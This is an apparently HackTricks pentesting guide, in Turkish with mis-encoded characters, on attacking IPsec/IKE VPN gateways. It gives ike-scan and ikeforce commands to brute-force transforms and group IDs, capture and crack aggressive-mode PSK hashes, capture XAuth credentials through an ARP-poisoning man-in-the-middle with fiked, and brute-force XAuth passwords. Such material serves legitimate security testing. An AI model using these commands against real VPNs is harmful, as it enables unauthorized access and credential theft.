# 500/udp - IPsec/IKE VPN Pentesting

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

**Try Hard GÃ¼venlik Grubu**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Temel Bilgiler

**IPsec**, aÄŸlar arasÄ±ndaki iletiÅŸimi (LAN'dan LAN'a) gÃ¼vence altÄ±na almak iÃ§in baÅŸlÄ±ca teknoloji olarak kabul edilir ve uzaktan kullanÄ±cÄ±lardan aÄŸ geÃ§idine (uzaktan eriÅŸim) hizmet vererek kurumsal VPN Ã§Ã¶zÃ¼mleri iÃ§in omurga gÃ¶revi gÃ¶rÃ¼r.

Ä°ki nokta arasÄ±nda bir **gÃ¼venlik birliÄŸi (SA)** oluÅŸturulmasÄ±, **IKE** tarafÄ±ndan yÃ¶netilir ve kimlik doÄŸrulama ve anahtar deÄŸiÅŸimi iÃ§in tasarlanmÄ±ÅŸ bir protokol olan ISAKMP'nin Ã§atÄ±sÄ± altÄ±nda Ã§alÄ±ÅŸÄ±r. Bu sÃ¼reÃ§ birkaÃ§ aÅŸamada gerÃ§ekleÅŸir:

- **Faz 1:** Ä°ki uÃ§ nokta arasÄ±nda gÃ¼venli bir kanal oluÅŸturulur. Bu, bir Ã–n PaylaÅŸÄ±lan Anahtar (PSK) veya sertifikalarÄ±n kullanÄ±mÄ±yla, Ã¼Ã§ Ã§ift mesaj iÃ§eren ana mod veya **agresif mod** kullanÄ±larak baÅŸarÄ±lÄ±r.
- **Faz 1.5:** Zorunlu olmasa da, Bu aÅŸama, KullanÄ±cÄ± kimliÄŸini doÄŸrulayan GeniÅŸletilmiÅŸ Kimlik DoÄŸrulama AÅŸamasÄ± olarak bilinir ve baÄŸlanmaya Ã§alÄ±ÅŸan kullanÄ±cÄ±nÄ±n kimliÄŸini kullanÄ±cÄ± adÄ± ve ÅŸifre gerektirerek doÄŸrular.
- **Faz 2:** Bu aÅŸama, **ESP** ve **AH** ile verileri gÃ¼vence altÄ±na almak iÃ§in parametreleri mÃ¼zakere etmeye adanmÄ±ÅŸtÄ±r. GÃ¼venliÄŸi artÄ±rmak iÃ§in **MÃ¼kemmel Ä°leri Gizlilik (PFS)** saÄŸlamak iÃ§in Faz 1'dekilerden farklÄ± algoritmalarÄ±n kullanÄ±lmasÄ±na izin verir.

**VarsayÄ±lan port:** 500/udp

## nmap kullanarak hizmeti keÅŸfedin
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **GeÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulma**

IPSec yapÄ±landÄ±rmasÄ± yalnÄ±zca bir veya birkaÃ§ dÃ¶nÃ¼ÅŸÃ¼mÃ¼ kabul etmek Ã¼zere hazÄ±rlanabilir. Bir dÃ¶nÃ¼ÅŸÃ¼m, deÄŸerlerin bir kombinasyonudur. **Her dÃ¶nÃ¼ÅŸÃ¼m**, DES veya 3DES gibi **ÅŸifreleme algoritmasÄ±**, SHA veya MD5 gibi **bÃ¼tÃ¼nlÃ¼k algoritmasÄ±**, Ã¶nceden paylaÅŸÄ±lan bir anahtar gibi **kimlik doÄŸrulama tÃ¼rÃ¼**, Diffie-Hellman 1 veya 2 gibi anahtar **daÄŸÄ±tÄ±m algoritmasÄ±** ve 28800 saniye gibi **Ã¶mÃ¼r** iÃ§eren bir dizi Ã¶zelliÄŸi iÃ§erir.

DolayÄ±sÄ±yla yapmanÄ±z gereken ilk ÅŸey, sunucunun sizinle iletiÅŸim kurmasÄ±nÄ± saÄŸlayacak **geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulmaktÄ±r**. Bunu yapmak iÃ§in **ike-scan** aracÄ±nÄ± kullanabilirsiniz. VarsayÄ±lan olarak, Ike-scan ana modda Ã§alÄ±ÅŸÄ±r ve bir ISAKMP baÅŸlÄ±ÄŸÄ± ve iÃ§inde **sekiz dÃ¶nÃ¼ÅŸÃ¼m bulunan tek bir teklifle** bir paket gÃ¶nderir.

YanÄ±ta baÄŸlÄ± olarak, uÃ§ nokta hakkÄ±nda bazÄ± bilgiler elde edebilirsiniz:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
GÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi Ã¶nceki yanÄ±tta **AUTH** adÄ±nda bir alan ve deÄŸeri **PSK** olan bir alan var. Bu, vpn'nin bir Ã¶nceden paylaÅŸÄ±lan anahtar kullanÄ±larak yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ± anlamÄ±na gelir (ve bu gerÃ§ekten bir pentester iÃ§in iyidir).\
**Son satÄ±rÄ±n deÄŸeri de Ã§ok Ã¶nemlidir:**

* _0 dÃ¶nÃ¼ÅŸ el sÄ±kÄ±ÅŸmasÄ±; 0 dÃ¶nÃ¼ÅŸ bildirimi:_ Bu, hedefin **bir IPsec aÄŸ geÃ§idi olmadÄ±ÄŸÄ±nÄ±** gÃ¶sterir.
* _**1 dÃ¶nÃ¼ÅŸ el sÄ±kÄ±ÅŸmasÄ±; 0 dÃ¶nÃ¼ÅŸ bildirimi:**_ Bu, **hedefin IPsec iÃ§in yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nÄ± ve IKE mÃ¼zakeresi yapmaya istekli olduÄŸunu ve Ã¶nerdiÄŸiniz dÃ¶nÃ¼ÅŸlerden bir veya daha fazlasÄ±nÄ±n kabul edilebilir olduÄŸunu** gÃ¶sterir (geÃ§erli bir dÃ¶nÃ¼ÅŸ Ã§Ä±ktÄ±da gÃ¶sterilecektir).
* _0 dÃ¶nÃ¼ÅŸ el sÄ±kÄ±ÅŸmasÄ±; 1 dÃ¶nÃ¼ÅŸ bildirimi:_ VPN aÄŸ geÃ§itleri, **Ã¶nerilen dÃ¶nÃ¼ÅŸlerin hiÃ§birinin kabul edilebilir olmadÄ±ÄŸÄ±nda bir bildirim mesajÄ± ile yanÄ±t verir** (ancak bazÄ± aÄŸ geÃ§itleri bunu yapmaz, bu durumda daha fazla analiz ve revize edilmiÅŸ bir teklif denemelisiniz).

Bu durumda zaten geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼mÃ¼mÃ¼z var ancak 3. durumdaysanÄ±z, geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulmak iÃ§in biraz **kaba kuvvet uygulamanÄ±z gerekir:**

Ã–ncelikle tÃ¼m olasÄ± dÃ¶nÃ¼ÅŸÃ¼mleri oluÅŸturmanÄ±z gerekmektedir:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Ve ardÄ±ndan her birini ike-tarama kullanarak kaba kuvvet saldÄ±rÄ±sÄ± yapÄ±n (bu birkaÃ§ dakika sÃ¼rebilir):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
EÄŸer brute-force Ã§alÄ±ÅŸmadÄ±ysa, belki sunucu geÃ§erli dÃ¶nÃ¼ÅŸÃ¼mlere bile el sÄ±kÄ±ÅŸmalar olmadan yanÄ±t veriyor. O zaman aynÄ± brute-force'u dene ancak agresif modu kullanarak:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
UmarÄ±m **geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m yansÄ±tÄ±lÄ±r**.\
AynÄ± saldÄ±rÄ±yÄ± [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) kullanarak deneyebilirsiniz.\
AyrÄ±ca [**ikeforce**](https://github.com/SpiderLabs/ikeforce) ile dÃ¶nÃ¼ÅŸÃ¼mleri kaba kuvvet uygulayabilirsiniz:
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

**DH Grubu: 14 = 2048-bit MODP** ve **15 = 3072-bit** olarak belirtilir. **2 = HMAC-SHA = SHA1** (bu durumda). `--trans` formatÄ± ise $Enc,$Hash,$Auth,$DH ÅŸeklindedir.

Cisco, DH gruplarÄ± 1 ve 2'nin yeterince gÃ¼Ã§lÃ¼ olmadÄ±ÄŸÄ±nÄ± belirtir. Uzmanlar, **kaynaklarÄ± bol olan Ã¼lkelerin**, bu zayÄ±f gruplarÄ± kullanan verilerin ÅŸifresini kolayca Ã§Ã¶zebileceÄŸine inanmaktadÄ±r. Bu, kodlarÄ± hÄ±zlÄ±ca kÄ±rmak iÃ§in onlarÄ± hazÄ±rlayan Ã¶zel bir yÃ¶ntem kullanÄ±larak gerÃ§ekleÅŸtirilir. Bu yÃ¶ntemi kurmak oldukÃ§a pahalÄ± olmasÄ±na raÄŸmen, bu gÃ¼Ã§lÃ¼ Ã¼lkelerin, ÅŸifrelenmiÅŸ verileri gerÃ§ek zamanlÄ± olarak okumalarÄ±na izin verir (Ã¶rneÄŸin 1,024-bit veya daha kÃ¼Ã§Ã¼k bir grup kullanÄ±lÄ±yorsa).

### Sunucu parmak izi alma

Daha sonra, cihazÄ±n **Ã¼reticisini keÅŸfetmek** iÃ§in ike-tarama kullanabilirsiniz. AracÄ±, bir baÅŸlangÄ±Ã§ teklifi gÃ¶nderir ve yeniden Ã§almayÄ± durdurur. ArdÄ±ndan, sunucudan alÄ±nan mesajlar ile eÅŸleÅŸen yanÄ±t deseni arasÄ±ndaki **zaman farkÄ±nÄ± analiz ederek**, pentester VPN aÄŸ geÃ§idi Ã¼reticisini baÅŸarÄ±lÄ± bir ÅŸekilde belirleyebilir. AyrÄ±ca, bazÄ± VPN sunucularÄ± IKE ile **isteÄŸe baÄŸlÄ± Vendor ID (VID) yÃ¼kÃ¼** kullanacaktÄ±r.

Gerekirse geÃ§erli dÃ¶nÃ¼ÅŸÃ¼mÃ¼ belirtin (using --trans)

EÄŸer IKE, Ã¼reticiyi keÅŸfederse, bunu yazdÄ±racaktÄ±r:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Bu ayrÄ±ca nmap betiÄŸi _**ike-version**_ ile de baÅŸarÄ±labilir.

## DoÄŸru KimliÄŸi (grup adÄ±nÄ±) Bulma

Hash'i yakalamanÄ±za izin verilmesi iÃ§in Agresif modu destekleyen geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m ve doÄŸru kimliÄŸe (grup adÄ±) ihtiyacÄ±nÄ±z vardÄ±r. Muhtemelen geÃ§erli grup adÄ±nÄ± bilmiyorsunuz, bu yÃ¼zden onu kaba kuvvetle bulmanÄ±z gerekecek.\
Bunu yapmak iÃ§in size 2 yÃ¶ntem Ã¶neririm:

### ike-scan ile Kimlik Kaba Kuvvet AtaÄŸÄ±

Ã–ncelikle, hash'i toplamayÄ± deneyerek sahte bir kimlikle bir istekte bulunun ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
EÄŸer **hiÃ§bir hash dÃ¶ndÃ¼rÃ¼lmezse**, o zaman muhtemelen bu kaba kuvvet saldÄ±rÄ±sÄ± yÃ¶ntemi iÅŸe yarayacaktÄ±r. **EÄŸer bir hash dÃ¶ndÃ¼rÃ¼lÃ¼rse, bu, sahte bir kimlik iÃ§in sahte bir hash'in geri gÃ¶nderileceÄŸi anlamÄ±na gelir, bu nedenle bu yÃ¶ntem kimliÄŸi kaba kuvvetle Ã§Ã¶zmek iÃ§in gÃ¼venilir olmayacaktÄ±r**. Ã–rneÄŸin, sahte bir hash dÃ¶ndÃ¼rÃ¼lebilir (bu modern sÃ¼rÃ¼mlerde meydana gelir):

![](<../.gitbook/assets/image (110).png>)

Ancak dediÄŸim gibi, hiÃ§bir hash dÃ¶ndÃ¼rÃ¼lmezse, o zaman ike-scan kullanarak yaygÄ±n grup adlarÄ±nÄ± kaba kuvvetle denemelisiniz.

Bu betik **mÃ¼mkÃ¼n olasÄ± kimlikleri kaba kuvvetle deneyecek** ve geÃ§erli bir el sÄ±kÄ±ÅŸma dÃ¶ndÃ¼rÃ¼len kimlikleri (bu geÃ§erli bir grup adÄ± olacaktÄ±r) geri dÃ¶ndÃ¼recektir.

Belirli bir dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, bunu ike-scan komutuna ekleyin. Ve birden fazla dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, hepsini denemek iÃ§in yeni bir dÃ¶ngÃ¼ eklemekte Ã¶zgÃ¼rsÃ¼nÃ¼z (bunlardan biri dÃ¼zgÃ¼n Ã§alÄ±ÅŸana kadar hepsini denemelisiniz).

Ä°keforce'un [grup adlarÄ± sÃ¶zlÃ¼ÄŸÃ¼nÃ¼](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) veya [seclists'teki](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) yaygÄ±n grup adlarÄ± listesini kaba kuvvetle denemek iÃ§in kullanabilirsiniz:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
### Ä°ker ile ID'nin Bruteforce Edilmesi

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) ayrÄ±ca **ike-scan** kullanarak olasÄ± grup adlarÄ±nÄ± bruteforce etmek iÃ§in kendi yÃ¶ntemini izler. **ike-scan Ã§Ä±ktÄ±sÄ±na dayanarak geÃ§erli bir ID bulmak iÃ§in kendi yÃ¶ntemini izler**.

### ikeforce ile ID'nin Bruteforce Edilmesi

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) aynÄ± zamanda **ID'leri bruteforce etmek iÃ§in kullanÄ±labilecek bir araÃ§tÄ±r**. Bu araÃ§, **farklÄ± zayÄ±flÄ±klarÄ± sÃ¶mÃ¼rmeye Ã§alÄ±ÅŸacaktÄ±r** ve **geÃ§erli ve geÃ§ersiz ID'leri ayÄ±rt etmek iÃ§in kullanÄ±labilecek farklÄ± zayÄ±flÄ±klarÄ± sÃ¶mÃ¼rmeye Ã§alÄ±ÅŸacaktÄ±r** (yanlÄ±ÅŸ pozitif ve yanlÄ±ÅŸ negatifler olabilir, bu yÃ¼zden mÃ¼mkÃ¼nse ike-scan yÃ¶ntemini kullanmayÄ± tercih ederim).

VarsayÄ±lan olarak **ikeforce**, baÅŸlangÄ±Ã§ta sunucunun davranÄ±ÅŸÄ±nÄ± kontrol etmek ve kullanÄ±lacak taktiÄŸi belirlemek iÃ§in bazÄ± rastgele ID'ler gÃ¶nderecektir.

* **Ä°lk yÃ¶ntem**, Cisco sistemlerinin **Dead Peer Detection DPD** bilgisini arayarak grup adlarÄ±nÄ± bruteforce etmektir (bu bilgi, grup adÄ± doÄŸruysa sunucu tarafÄ±ndan yalnÄ±zca yanÄ±tlanÄ±r).
* Mevcut olan **ikinci yÃ¶ntem**, her denemeye gÃ¶nderilen yanÄ±tlarÄ±n sayÄ±sÄ±nÄ± kontrol etmektir, Ã§Ã¼nkÃ¼ bazen doÄŸru ID kullanÄ±ldÄ±ÄŸÄ±nda daha fazla paket gÃ¶nderilir.
* **ÃœÃ§Ã¼ncÃ¼ yÃ¶ntem**, yanlÄ±ÅŸ ID'ye yanÄ±t olarak "INVALID-ID-INFORMATION" aramaktÄ±r.
* Son olarak, sunucu kontrollerine hiÃ§bir yanÄ±t vermezse, **ikeforce** sunucuyu bruteforce etmeye Ã§alÄ±ÅŸacak ve doÄŸru ID gÃ¶nderildiÄŸinde sunucunun bir paketle yanÄ±t verip vermediÄŸini kontrol edecektir.

AÃ§Ä±kÃ§a, ID'yi bruteforce etme amacÄ±, geÃ§erli bir ID'ye sahip olduÄŸunuzda **PSK'yi** elde etmektir. ArdÄ±ndan, **ID** ve **PSK** ile **XAUTH'Ä±** bruteforce etmeniz gerekecektir.

EÄŸer belirli bir dÃ¶nÃ¼ÅŸÃ¼m keÅŸfetmiÅŸseniz, bunu ikeforce komutuna ekleyin. Ve eÄŸer birden fazla dÃ¶nÃ¼ÅŸÃ¼m keÅŸfetmiÅŸseniz, hepsini denemek iÃ§in yeni bir dÃ¶ngÃ¼ eklemekte Ã¶zgÃ¼rsÃ¼nÃ¼z (doÄŸru Ã§alÄ±ÅŸana kadar hepsini denemelisiniz).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(Kitap **AÄŸ GÃ¼venliÄŸi DeÄŸerlendirmesi: AÄŸÄ±nÄ±zÄ± TanÄ±yÄ±n**'dan): AyrÄ±ca, VPN istemcisi ve sunucusu arasÄ±ndaki baÄŸlantÄ±yÄ± dinleyerek geÃ§erli kullanÄ±cÄ± adlarÄ±nÄ± elde etmek mÃ¼mkÃ¼ndÃ¼r, Ã§Ã¼nkÃ¼ istemci kimliÄŸini iÃ§eren ilk saldÄ±rgan mod paketi aÃ§Ä±k bir ÅŸekilde gÃ¶nderilir

![](<../.gitbook/assets/image (111).png>)

## Hash'in YakalanmasÄ± ve KÄ±rÄ±lmasÄ±

Son olarak, EÄŸer bir **geÃ§erli dÃ¶nÃ¼ÅŸÃ¼m** ve **grup adÄ±** bulduysanÄ±z ve **saldÄ±rgan mod izin veriliyorsa**, o zaman kÄ±rÄ±labilir hash'i Ã§ok kolayca yakalayabilirsiniz:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Hash, _hash.txt_ dosyasÄ±nÄ±n iÃ§ine kaydedilecektir.

Hash'i **Ã§Ã¶zmek** iÃ§in **psk-crack**, **john** ( [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py) kullanarak) ve **hashcat** kullanabilirsiniz:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Agresif mod IKE** genellikle **grup kimlik doÄŸrulama** amaÃ§larÄ± iÃ§in **Ã–n PaylaÅŸÄ±lan Anahtar (PSK)** ile birleÅŸtirilir. Bu yÃ¶ntem, **GeniÅŸletilmiÅŸ Kimlik DoÄŸrulama (XAuth)** tarafÄ±ndan desteklenir ve ek bir **kullanÄ±cÄ± kimlik doÄŸrulama** katmanÄ± ekler. Bu tÃ¼r kimlik doÄŸrulama genellikle **Microsoft Active Directory**, **RADIUS** veya benzeri sistemler gibi hizmetlerden yararlanÄ±r.

**IKEv2'ye** geÃ§iÅŸte, kullanÄ±cÄ±larÄ±n kimlik doÄŸrulamasÄ± amacÄ±yla **XAuth** yerine **EAP (GeniÅŸletilebilir Kimlik DoÄŸrulama ProtokolÃ¼)** kullanÄ±ldÄ±ÄŸÄ±nda dikkate deÄŸer bir deÄŸiÅŸiklik gÃ¶rÃ¼lÃ¼r. Bu deÄŸiÅŸiklik, gÃ¼venli iletiÅŸim protokollerinde kimlik doÄŸrulama uygulamalarÄ±nda bir evrimi vurgular.


### Kimlik bilgilerini yakalamak iÃ§in Yerel AÄŸ MitM

BÃ¶ylece _fiked_ kullanarak giriÅŸ verilerini yakalayabilir ve herhangi bir varsayÄ±lan kullanÄ±cÄ± adÄ±nÄ±n olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz (IKE trafiÄŸini dinlemek iÃ§in `fiked`'e yÃ¶nlendirmeniz gerekmektedir, bu da ARP zehirlemesi ile yapÄ±labilir, [daha fazla bilgi](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked, bir VPN uÃ§ noktasÄ± olarak hareket edecek ve XAuth kimlik bilgilerini yakalayacaktÄ±r:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
### MitM saldÄ±rÄ±sÄ± yapmak iÃ§in IPSec'i kullanarak, tÃ¼nel oluÅŸturulamazsa trafiÄŸin aÃ§Ä±k bir ÅŸekilde gÃ¶nderilebileceÄŸi port 500'e tÃ¼m trafiÄŸi engelleyin.

### ikeforce ile XAUTH kullanÄ±cÄ± adÄ± ve ÅŸifresini kaba kuvvet saldÄ±rÄ±sÄ±yla denemek

**XAUTH**'u (geÃ§erli bir grup adÄ± **id** ve **psk**'yi bildiÄŸinizde) kaba kuvvet saldÄ±rÄ±sÄ± yapmak iÃ§in bir kullanÄ±cÄ± adÄ± veya kullanÄ±cÄ± adÄ± listesi ve bir ÅŸifre listesi kullanabilirsiniz:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Bu ÅŸekilde, ikeforce, her kullanÄ±cÄ± adÄ±:ÅŸifre kombinasyonunu deneyerek baÄŸlantÄ± kurmaya Ã§alÄ±ÅŸacaktÄ±r.

EÄŸer bir veya birkaÃ§ geÃ§erli dÃ¶nÃ¼ÅŸ bulduysanÄ±z, bunlarÄ± Ã¶nceki adÄ±mlarda olduÄŸu gibi kullanÄ±n.

## IPSEC VPN ile Kimlik DoÄŸrulama

Kali'de, IPsec tÃ¼nelleri kurmak iÃ§in **VPNC** kullanÄ±lÄ±r. **Profiller** dizini `/etc/vpnc/` iÃ§inde bulunmalÄ±dÄ±r. Bu profilleri _**vpnc**_ komutunu kullanarak baÅŸlatabilirsiniz.

AÅŸaÄŸÄ±daki komutlar ve yapÄ±landÄ±rmalar, VPNC ile VPN baÄŸlantÄ±sÄ± kurma sÃ¼recini aÃ§Ä±klamaktadÄ±r:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
Bu kurulumda:

- `[VPN_GATEWAY_IP]`'yi VPN aÄŸ geÃ§idinin gerÃ§ek IP adresi ile deÄŸiÅŸtirin.
- `[VPN_CONNECTION_ID]`'yi VPN baÄŸlantÄ±sÄ±nÄ±n tanÄ±mlayÄ±cÄ±sÄ± ile deÄŸiÅŸtirin.
- `[VPN_GROUP_SECRET]`'yi VPN'nin grup ÅŸifresi ile deÄŸiÅŸtirin.
- `[VPN_USERNAME]` ve `[VPN_PASSWORD]`'Ä± VPN kimlik doÄŸrulama kimlik bilgileri ile deÄŸiÅŸtirin.
- `vpnc` baÅŸlatÄ±ldÄ±ÄŸÄ±nda atanacak olan iÅŸlem kimliÄŸini `[PID]` simgeler.

VPN'i yapÄ±landÄ±rÄ±rken yer tutucularÄ±n yerine gerÃ§ek, gÃ¼venli deÄŸerlerin kullanÄ±ldÄ±ÄŸÄ±ndan emin olun.

## Referans Materyal

* [PSK kÄ±rma makalesi](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [VPN UygulamasÄ±nÄ± Tarama](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3. BaskÄ±

## Shodan

* `port:500 IKE`

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na bakÄ±n(https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
